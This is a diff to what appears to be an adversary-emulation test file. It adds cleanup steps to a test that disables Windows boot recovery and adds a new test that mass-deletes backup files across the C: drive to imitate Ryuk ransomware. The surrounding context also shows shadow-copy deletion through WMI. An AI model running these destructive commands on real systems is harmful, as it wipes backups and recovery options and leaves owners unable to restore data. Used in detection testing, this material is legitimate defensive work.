@@ -73,6 +73,9 @@ atomic_tests:
     command: |
       bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
       bcdedit.exe /set {default} recoveryenabled no
+    cleanup_command: |
+      bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
+      bcdedit.exe /set {default} recoveryenabled yes
 
 - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
   description: |
@@ -80,7 +83,6 @@ atomic_tests:
     This technique is used by numerous ransomware families such as Sodinokibi/REvil.
     Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
     there may be no output displayed.
-
 
   supported_platforms:
     - windows
@@ -90,3 +92,15 @@ atomic_tests:
     elevation_required: true
     command: |
       Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+
+- name: Windows - Delete Backup Files
+  description: |
+    Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
+    to delete files from around the system.
+  supported_platforms:
+    - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
